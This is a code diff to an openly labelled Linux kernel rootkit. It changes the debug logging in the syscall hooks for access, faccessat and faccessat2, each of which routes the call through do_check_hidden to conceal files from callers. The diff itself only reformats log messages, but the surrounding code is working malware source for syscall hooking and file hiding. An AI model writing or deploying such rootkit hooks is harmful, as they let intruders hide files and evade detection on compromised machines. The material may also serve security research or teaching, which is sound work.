@@ -9,7 +9,7 @@
 // sys_access syscall hook handler
 SYSCALL_HOOK_HANDLER2(access, orig_access, p_regs, const char __user *, s_filename, int, i32_mode)
 {
-    pr_info("[ROOTKIT] access(%p, 0%o)\n", s_filename, i32_mode);
+    pr_info("[ROOTKIT] access(%p, %s%#o)\n", s_filename, SIGNED_ARG(i32_mode));
 
     return do_check_hidden(orig_access, p_regs, AT_FDCWD, s_filename, 0);
 }
@@ -18,7 +18,7 @@ SYSCALL_HOOK_HANDLER2(access, orig_access, p_regs, const char __user *, s_filena
 SYSCALL_HOOK_HANDLER3(faccessat, orig_faccessat, p_regs, int, i32_dfd, const char __user *,
                       s_filename, int, i32_mode)
 {
-    pr_info("[ROOTKIT] faccessat(%d, %p, 0%o)\n", i32_dfd, s_filename, i32_mode);
+    pr_info("[ROOTKIT] faccessat(%d, %p, %s%#o)\n", i32_dfd, s_filename, SIGNED_ARG(i32_mode));
 
     return do_check_hidden(orig_faccessat, p_regs, i32_dfd, s_filename, 0);
 }
@@ -27,7 +27,8 @@ SYSCALL_HOOK_HANDLER3(faccessat, orig_faccessat, p_regs, int, i32_dfd, const cha
 SYSCALL_HOOK_HANDLER4(faccessat2, orig_faccessat2, p_regs, int, i32_dfd, const char __user *,
                       s_filename, int, i32_mode, int, i32_flags)
 {
-    pr_info("[ROOTKIT] faccessat2(%d, %p, 0%o, %#x)\n", i32_dfd, s_filename, i32_mode, i32_flags);
+    pr_info("[ROOTKIT] faccessat2(%d, %p, %s%#o, %s%#x)\n", i32_dfd, s_filename,
+            SIGNED_ARG(i32_mode), SIGNED_ARG(i32_flags));
 
     return do_check_hidden(orig_faccessat2, p_regs, i32_dfd, s_filename, i32_flags);
 }
